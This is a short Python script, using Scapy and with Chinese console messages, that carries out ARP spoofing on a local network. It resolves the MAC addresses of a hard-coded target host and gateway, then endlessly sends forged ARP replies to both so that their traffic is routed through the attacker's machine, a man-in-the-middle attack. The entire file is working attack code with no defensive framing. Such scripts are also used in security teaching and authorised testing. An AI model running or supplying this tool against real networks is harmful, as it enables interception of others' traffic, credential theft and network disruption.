#--*--coding=utf-8--*--

from scapy.all import *
import optparse
import threading
import sys

def getMac(tgtIP):
    try:
        tgtMac = getmacbyip(tgtIP)
        return tgtMac
    except:
        print '[-]请检查目标IP是否存活' 


def poisonTarget(srcMac,targetMac,gatewayIp,targetIp):
	print "srcMac	===>",srcMac
	print "targetMac===>",targetMac
	print "gatewayIp===>",gatewayIp
	print "targetIp ===>",targetIp
	pkt = Ether(src=srcMac, dst=targetMac) / ARP(hwsrc=srcMac, psrc=gatewayIp, hwdst=targetMac, pdst=targetIp, op=2)
	sendp(pkt, inter=2, iface="eth0")
	return pkt
	
def poisonGateway(srcMac,gatewayMac,gatewayIp,targetIp):
	print "srcMac	===>",srcMac
	print "targetMac===>",gatewayMac
	print "gatewayIp===>",gatewayIp
	print "targetIp ===>",targetIp
	pkt = Ether(src=srcMac, dst=gatewayMac) / ARP(hwsrc=srcMac, psrc=targetIp, hwdst=gatewayMac, pdst=gatewayIp)
	sendp(pkt, inter=2, iface="eth0")
	return pkt
	

def main(): 
    targetIp = "192.168.1.199"
    gatewayIp = "192.168.1.1"
    interface =  "eth0"
    srcMac = get_if_hwaddr(interface)
    print '本机MAC地址是：',srcMac
    targetMac = getMac(targetIp)
    print '目标计算机MAC地址是：',targetMac
    gatewayMac = getMac(gatewayIp)
    print '网关MAC地址是：',gatewayMac
    raw_input('按任意键继续：')

   
    i = 1
    while True:
        PoisonTarget = threading.Thread(target=poisonTarget,args=(srcMac,targetMac,gatewayIp,targetIp))
        PoisonTarget.start()
        PoisonTarget.join()
        print str(i) + ' [*]发送一个计算机ARP欺骗包'
       
        PoisonGateway = threading.Thread(target=poisonGateway,args=(srcMac,gatewayMac,gatewayIp,targetIp))
        PoisonGateway.start()
        PoisonGateway.join()
        print str(i) + ' [*]发送一个网关ARP欺骗包'
        i += 1       
        
            

if __name__ == '__main__':
    main()
